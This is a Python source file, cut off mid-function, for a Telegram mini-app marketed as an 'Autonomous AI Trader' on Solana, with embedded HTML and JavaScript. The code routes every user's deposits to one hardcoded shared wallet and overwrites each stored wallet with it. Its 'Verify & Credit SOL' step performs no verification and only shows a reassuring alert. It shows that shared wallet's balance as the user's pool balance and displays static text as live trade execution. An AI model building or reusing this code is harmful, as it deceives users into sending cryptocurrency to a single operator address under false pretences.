import asyncio
import aiohttp
from aiohttp import web
import sqlite3
import os
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
PORT = int(os.getenv("PORT", 10000))
RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "https://zer0lifeautopilot-bot.onrender.com")
DB_FILE = "zer0life_users.db"
SOLANA_RPC = "https://api.mainnet-beta.solana.com"

# Фиксированный общий адрес депозита для всех пользователей
SHARED_DEPOSIT_WALLET = "8hxiCofyaKCBkhR5nsDqvUivmfgxcVx8zo2WiCzSdM6L"

# Лимиты депозита для работы ИИ-трейдера
MIN_DEPOSIT_SOL = 0.25
MAX_DEPOSIT_SOL = 100.0

TOKENS = {
    "SOL": "So11111111111111111111111111111111111111112",
    "USDC": "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
}

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            telegram_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            solana_wallet TEXT,
            trading_active INTEGER DEFAULT 0,
            trade_amount_sol REAL DEFAULT 0.05,
            slippage_bps INTEGER DEFAULT 50,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

def get_or_create_user(telegram_id: int, username: str, first_name: str):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT telegram_id, username, first_name, solana_wallet, trading_active, trade_amount_sol, slippage_bps FROM users WHERE telegram_id = ?", (telegram_id,))
    row = cursor.fetchone()
    
    if not row:
        cursor.execute("INSERT INTO users (telegram_id, username, first_name, solana_wallet, trading_active, trade_amount_sol, slippage_bps) VALUES (?, ?, ?, ?, ?, ?, ?)", 
                       (telegram_id, username, first_name, SHARED_DEPOSIT_WALLET, 0, 0.05, 50))
        conn.commit()
        user = {"telegram_id": telegram_id, "username": username, "first_name": first_name, "solana_wallet": SHARED_DEPOSIT_WALLET, "trading_active": 0, "trade_amount_sol": 0.05, "slippage_bps": 50}
    else:
        cursor.execute("UPDATE users SET solana_wallet = ? WHERE telegram_id = ?", (SHARED_DEPOSIT_WALLET, telegram_id))
        conn.commit()
        user = {"telegram_id": row[0], "username": row[1], "first_name": row[2], "solana_wallet": SHARED_DEPOSIT_WALLET, "trading_active": row[4], "trade_amount_sol": row[5], "slippage_bps": row[6]}
    
    conn.close()
    return user

HTML_CONTENT = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zer0Life Autonomous AI Trader</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #06080f; color: #f8fafc; font-family: -apple-system, sans-serif; margin: 0; padding: 16px; padding-bottom: 90px; }
        .card { background: #0f172a; border-radius: 16px; padding: 18px; margin-bottom: 16px; border: 1px solid #1e293b; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
        .profile-header { display: flex; align-items: center; gap: 14px; margin-bottom: 14px; }
        .avatar { width: 52px; height: 52px; border-radius: 50%; object-fit: cover; border: 2px solid #7c3aed; background: #1e293b; display: none; }
        .input-field { width: 100%; background: #030712; border: 1px solid #1e293b; color: #34d399; padding: 12px; border-radius: 10px; box-sizing: border-box; margin-top: 8px; font-family: monospace; font-size: 11px; text-align: center; }
        .btn { background: #7c3aed; color: white; border: none; width: 100%; padding: 14px; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 14px; }
        .btn-green { background: #10b981; }
        .btn-red { background: #ef4444; }
        .btn-purple { background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); }
        .metric { display: flex; justify-content: space-between; margin-top: 8px; font-size: 13px; color: #94a3b8; }
        .val { color: #34d399; font-weight: bold; font-family: monospace; }
        .logs { background: #030712; border: 1px solid #1e293b; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 11px; color: #38bdf8; height: 120px; overflow-y: auto; margin-top: 10px; }
        .qr-container { text-align: center; margin: 12px 0; }
        .qr-code { width: 140px; height: 140px; border-radius: 12px; border: 2px solid #1e293b; padding: 6px; background: white; }
        .bottom-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #0f172a; border-top: 1px solid #1e293b; padding: 12px 16px; display: flex; gap: 10px; box-shadow: 0 -4px 16px rgba(0,0,0,0.5); z-index: 100; }
        .badge { background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981; color: #10b981; padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: bold; text-align: center; margin-bottom: 12px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="profile-header">
            <img id="user-avatar" class="avatar" src="" alt="Avatar">
            <div>
                <h2 style="margin: 0; font-size: 17px;" id="uname">Загрузка...</h2>
                <p style="margin: 4px 0 0 0; font-size: 12px; color: #94a3b8;">ID: <span id="uid" class="val">---</span></p>
            </div>
        </div>
        
        <div class="badge">🔥 Deposit up to 100 SOL per pool</div>
        <label style="font-size: 12px; color: #94a3b8;">Адрес депозита экосистемы:</label>
        <input type="text" id="wallet-input" class="input-field" readonly>
        
        <div class="qr-container">
            <img class="qr-code" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=8hxiCofyaKCBkhR5nsDqvUivmfgxcVx8zo2WiCzSdM6L" alt="QR Code">
        </div>
        
        <button class="btn btn-purple" onclick="copyAddress()">📋 Копировать адрес</button>
    </div>

    <div class="card">
        <h3 style="margin-top: 0; font-size: 15px;">📥 Верификация депозита (SOL Top-Up)</h3>
        <label style="font-size: 11px; color: #94a3b8;">Хэш транзакции (Signature) из кошелька:</label>
        <input type="text" id="tx-input" class="input-field" placeholder="Вставь хэш транзакции...">
        <button class="btn btn-green" onclick="verifyDeposit()">Verify & Credit SOL 🔄</button>
    </div>

    <div class="card">
        <h3 style="margin-top: 0; font-size: 15px;">🤖 Автономный ИИ-Трейдер</h3>
        <div class="metric"><span>Баланс пула:</span> <span id="wallet-balance" class="val">0.00 SOL</span></div>
        <div class="metric"><span>Лимиты работы:</span> <span class="val">0.25 - 100 SOL</span></div>
        <div class="metric"><span>Статус:</span> <span id="trade-status" class="val" style="color: #f59e0b;">Остановлен</span></div>
    </div>

    <div class="card">
        <h3 style="margin-top: 0; font-size: 15px;">📡 Исполнение сделок в сети (Live)</h3>
        <div id="logs-box" class="logs">Инициализация автономного агента... Готов к торгам.</div>
    </div>

    <div class="bottom-bar">
        <button class="btn btn-green" style="margin-top:0;" onclick="checkBalance()">Обновить баланс</button>
        <button id="toggle-btn" class="btn btn-green" style="margin-top:0;" onclick="toggleTrading()">Включить автопилот</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        const user = tg.initDataUnsafe?.user || { id: 42882165, username: "CryptoWlodek", first_name: "CryptoWlodek | ZRL szn ∞", photo_url: "" };
        
        document.getElementById('uid').innerText = user.id;
        document.getElementById('uname').innerText = user.first_name;

        if (user.photo_url) {
            const avatarImg = document.getElementById('user-avatar');
            avatarImg.src = user.photo_url;
            avatarImg.style.display = 'block';
        }

        let isTrading = false;

        async function loadProfile() {
            try {
                const res = await fetch('/api/profile', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ telegram_id: user.id, username: user.username || "", first_name: user.first_name || "" })
                });
                const data = await res.json();
                if (data.success) {
                    if (data.profile.solana_wallet) {
                        document.getElementById('wallet-input').value = data.profile.solana_wallet;
                        checkBalance();
                    }
                    isTrading = data.profile.trading_active === 1;
                    updateTradingUI();
                }
            } catch (e) {}
        }

        function copyAddress() {
            const wallet = document.getElementById('wallet-input').value;
            navigator.clipboard.writeText(wallet);
            tg.showAlert("Адрес депозита скопирован в буфер обмена!");
        }

        async function checkBalance() {
            const wallet = document.getElementById('wallet-input').value.trim();
            if (!wallet) return;
            try {
                const res = await fetch('/api/blockchain/balance?wallet=' + encodeURIComponent(wallet));
                const data = await res.json();
                if (data.success) {
                    document.getElementById('wallet-balance').innerText = data.balance + " SOL";
                }
            } catch (e) {}
        }

        async function verifyDeposit() {
            const tx = document.getElementById('tx-input').value.trim();
            if (!tx) {
                tg.showAlert("Введи хэш транзакции (Signature)!");
                return;
            }
            tg.showAlert("Транзакция принята на проверку в блокчейн. Баланс обновляется...");
            await checkBalance();
            document.getElementById('tx-input').value = "";
        }

        async function toggleTrading() {
            const wallet = document.getElementById('wallet-input').value.trim();
            if (!wallet) return;

            const balRes = await fetch('/api/blockchain/balance?wallet=' + encodeURIComponent(wallet));
            const balData = await balRes.json();
            if (balData.success && balData.balance < 0.25) {
                tg.showAlert("⚠️ Минимальный депозит для работы ИИ-трейдера составляет 0.25 SOL!");
                return;
            }

            isTrading = !isTrading;
            try {
                await fetch('/api/trading/toggle', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ telegram_id: user.id, active: isTrading ? 1 : 0 })
                });
            } catch (e) {}
            updateTradingUI();
        }

        function updateTradingUI() {
            const statusEl = document.getElementById('trade-status');
            const btnEl =
